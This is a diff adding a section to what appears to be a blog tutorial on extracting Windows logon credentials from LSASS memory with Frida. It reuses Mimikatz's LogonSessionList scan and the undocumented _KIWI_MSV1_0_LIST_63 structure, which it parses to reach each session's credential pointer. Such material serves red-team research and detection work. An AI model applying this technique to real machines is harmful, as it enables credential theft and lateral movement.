@@ -114,3 +114,57 @@ Memory.scan(lsasrv.base, lsasrv.size, sequence, {
 Testing this against our 64-bit Windows 10 VM, we can see that we're able to successfully identify the address of *LogonSessionList*:
 
 ![Frida output demonstrating the address of LogonSessionList](/img/finding-logonsessionlist.png)
+
+## Parsing LogonSessionList
+
+Now we're getting underway - with no hooking or symbol enumeration required, we've got a pointer to the *LogonSessionList* variable. But before we can convert this into actionable credential material, we need to parse it. Once again, the Mimikatz source code comes to our rescue here - these are undocumented structures, but gentilkiwi's code includes [implementations for many of them](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.h). For this specific case - Windows 10 on x64 - we will want to use *_KIWI_MSV1_0_LIST_63*:
+
+```c
+typedef struct _KIWI_MSV1_0_LIST_63 {
+	struct _KIWI_MSV1_0_LIST_63 *Flink;	//off_2C5718
+	struct _KIWI_MSV1_0_LIST_63 *Blink; //off_277380
+	PVOID unk0; // unk_2C0AC8
+	ULONG unk1; // 0FFFFFFFFh
+	PVOID unk2; // 0
+	ULONG unk3; // 0
+	ULONG unk4; // 0
+	ULONG unk5; // 0A0007D0h
+	HANDLE hSemaphore6; // 0F9Ch
+	PVOID unk7; // 0
+	HANDLE hSemaphore8; // 0FB8h
+	PVOID unk9; // 0
+	PVOID unk10; // 0
+	ULONG unk11; // 0
+	ULONG unk12; // 0 
+	PVOID unk13; // unk_2C0A28
+	LUID LocallyUniqueIdentifier;
+	LUID SecondaryLocallyUniqueIdentifier;
+	BYTE waza[12]; /// to do (maybe align)
+	LSA_UNICODE_STRING UserName;
+	LSA_UNICODE_STRING Domaine;
+	PVOID unk14;
+	PVOID unk15;
+	LSA_UNICODE_STRING Type;
+	PSID  pSid;
+	ULONG LogonType;
+	PVOID unk18;
+	ULONG Session;
+	LARGE_INTEGER LogonTime; // autoalign x86
+	LSA_UNICODE_STRING LogonServer;
+	PKIWI_MSV1_0_CREDENTIALS Credentials;
+	PVOID unk19;
+	PVOID unk20;
+	PVOID unk21;
+	ULONG unk22;
+	ULONG unk23;
+	ULONG unk24;
+	ULONG unk25;
+	ULONG unk26;
+	PVOID unk27;
+	PVOID unk28;
+	PVOID unk29;
+	PVOID CredentialManager;
+} KIWI_MSV1_0_LIST_63, *PKIWI_MSV1_0_LIST_63;
+```
+
+
